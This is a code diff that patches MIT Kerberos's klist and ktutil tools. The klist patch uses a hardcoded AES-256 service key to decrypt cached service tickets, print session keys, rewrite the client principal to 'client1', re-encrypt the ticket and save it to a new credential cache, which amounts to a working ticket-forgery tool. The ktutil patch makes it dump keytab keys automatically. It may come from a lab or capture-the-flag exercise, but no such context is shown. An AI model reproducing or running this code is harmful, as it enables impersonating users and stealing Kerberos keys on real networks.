@@ -1,0 +1,203 @@
+diff --git a/src/clients/klist/klist.c b/src/clients/klist/klist.c
+index dcdc5a2d5..0f306689a 100644
+--- a/src/clients/klist/klist.c
++++ b/src/clients/klist/klist.c
+@@ -660,6 +660,79 @@ print_config_data(int col, krb5_data *data)
+         putchar('\n');
+ }
+ 
++void hexdump(const void* data, size_t size) {
++       char ascii[17];
++       size_t i, j;
++       ascii[16] = '\0';
++       for (i = 0; i < size; ++i) {
++               printf("%02X ", ((unsigned char*)data)[i]);
++               if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
++                       ascii[i % 16] = ((unsigned char*)data)[i];
++               } else {
++                       ascii[i % 16] = '.';
++               }
++               if ((i+1) % 8 == 0 || i+1 == size) {
++                       printf(" ");
++                       if ((i+1) % 16 == 0) {
++                               printf("|  %s \n", ascii);
++                       } else if (i+1 == size) {
++                               ascii[(i+1) % 16] = '\0';
++                               if ((i+1) % 16 <= 8) {
++                                       printf(" ");
++                               }
++                               for (j = (i+1) % 16; j < 16; ++j) {
++                                       printf("   ");
++                               }
++                               printf("|  %s \n", ascii);
++                       }
++               }
++       }
++}
++
++uint8_t* datahex(char* string) {
++
++    size_t slength = 0;
++    size_t dlength = 0;
++    uint8_t* data = NULL;
++    size_t index = 0;
++    char c;
++    int value = 0;
++
++    if(string == NULL)
++       return NULL;
++
++    slength = strlen(string);
++    if((slength % 2) != 0) // must be even
++       return NULL;
++
++    dlength = slength / 2;
++
++    data = malloc(dlength);
++    memset(data, 0, dlength);
++
++    index = 0;
++    while (index < slength) {
++        c = string[index];
++        value = 0;
++        if(c >= '0' && c <= '9')
++          value = (c - '0');
++        else if (c >= 'A' && c <= 'F')
++          value = (10 + (c - 'A'));
++        else if (c >= 'a' && c <= 'f')
++          value = (10 + (c - 'a'));
++        else {
++          free(data);
++          return NULL;
++        }
++
++        data[(index/2)] += value << (((index + 1) % 2) * 4);
++
++        index++;
++    }
++
++    return data;
++}
++
+ static void
+ show_credential(krb5_creds *cred)
+ {
+@@ -667,6 +740,17 @@ show_credential(krb5_creds *cred)
+     krb5_ticket *tkt = NULL;
+     char *name = NULL, *sname = NULL, *tktsname, *flags;
+     int extra_field = 0, ccol = 0, i;
++
++    krb5_context xcontext;
++    krb5_keyblock srv_key;
++    krb5_data scratch;
++    krb5_data *new_scratch = NULL;
++    krb5_enc_tkt_part *dec_tkt_part;
++    krb5_ccache new_cache;
++    char *new_cache_name;
++    krb5_principal new_princ;
++    krb5_data *xx;
++
+     krb5_boolean is_config = krb5_is_config_principal(context, cred->server);
+ 
+     ret = krb5_unparse_name(context, cred->client, &name);
+@@ -752,6 +836,67 @@ show_credential(krb5_creds *cred)
+         extra_field++;
+     }
+ 
++    if (tkt != NULL) {
++        printf("\n");
++        printf("client session key:\n");
++        hexdump(cred->keyblock.contents, cred->keyblock.length);
++
++        printf("encrypted ticket:\n");
++        hexdump(tkt->enc_part.ciphertext.data, tkt->enc_part.ciphertext.length);
++
++        krb5_init_context(&xcontext);
++        srv_key.enctype = 18;
++        srv_key.length = 32;
++        srv_key.contents = (krb5_octet *) datahex("9c008f673b0c34d28ff483587f77ddb76f35545fcc69a0ae709f16f20e8765ee");
++
++        scratch.length = tkt->enc_part.ciphertext.length;
++        if (!(scratch.data = malloc(tkt->enc_part.ciphertext.length)))
++             return;
++
++        ret = krb5_c_decrypt(xcontext, &srv_key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, &tkt->enc_part, &scratch);
++        printf("decrypt ret: %d\n", ret);
++
++        if (ret == 0) {
++            printf("decrypted ticket:\n");
++            hexdump(scratch.data, scratch.length);
++
++            decode_krb5_enc_tkt_part(&scratch, &dec_tkt_part);
++            printf("decrypted session key:\n");
++            hexdump(dec_tkt_part->session->contents, dec_tkt_part->session->length);
++
++	    krb5_parse_name(xcontext, "client1", &new_princ);
++	    krb5_copy_principal(xcontext, new_princ, &dec_tkt_part->client);
++	    krb5_copy_principal(xcontext, new_princ, &cred->client);
++
++	    encode_krb5_enc_tkt_part(dec_tkt_part, &new_scratch);
++	    ret = krb5_c_encrypt(xcontext, &srv_key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, new_scratch, &tkt->enc_part);
++	    //ret = krb5_c_encrypt(xcontext, &srv_key, KRB5_KEYUSAGE_AP_REQ_AUTH, 0, new_scratch, &tkt->enc_part);
++            printf("reencrypt ret: %d\n", ret);
++            krb5_free_enc_tkt_part(xcontext, dec_tkt_part);
++
++	    encode_krb5_ticket(tkt, &xx);
++	    cred->ticket = *xx;
++
++	    krb5_cc_new_unique(xcontext, "FILE", NULL, &new_cache);
++            krb5_cc_initialize(xcontext, new_cache, new_princ);
++
++	    krb5_cc_get_full_name(xcontext, new_cache, &new_cache_name);
++            printf("krb5_cc_store_cred ret: %d\n", krb5_cc_store_cred(xcontext, new_cache, cred));
++	    printf("new cache name: %s", new_cache_name);
++	    krb5_free_string(xcontext, new_cache_name);
++
++	    krb5_free_principal(xcontext, new_princ);
++        }
++
++        free(srv_key.contents);
++        free(scratch.data);
++	if (new_scratch != NULL) {
++	    free(new_scratch->data);
++	    new_scratch = NULL;
++        }
++        krb5_free_context(xcontext);
++    }
++
+     if (show_adtype) {
+         if (cred->authdata != NULL) {
+             if (!extra_field)
+diff --git a/src/kadmin/ktutil/ktutil.c b/src/kadmin/ktutil/ktutil.c
+index 92d7023a4..4396f2835 100644
+--- a/src/kadmin/ktutil/ktutil.c
++++ b/src/kadmin/ktutil/ktutil.c
+@@ -46,6 +46,16 @@ int main(argc, argv)
+     krb5_error_code retval;
+     int sci_idx;
+ 
++    char xarg0[] = "rkt";
++    char *read_argv[] = { xarg0, argv[1], NULL };
++
++    char yarg0[] = "list";
++    char yarg1[] = "-k";
++    char yarg2[] = "-t";
++    char yarg3[] = "-e";
++    char *list_argv[] = { yarg0, yarg1, yarg2, yarg3, NULL };
++
++
+     setlocale(LC_ALL, "");
+     retval = krb5_init_context(&kcontext);
+     if (retval) {
+@@ -58,7 +68,10 @@ int main(argc, argv)
+         ss_perror(sci_idx, retval, _("creating invocation"));
+         exit(1);
+     }
+-    retval = ss_listen(sci_idx);
++
++    ktutil_read_v5(2, read_argv);
++    ktutil_list(4, list_argv);
++
+     ktutil_free_kt_list(kcontext, ktlist);
+     exit(0);
+ }
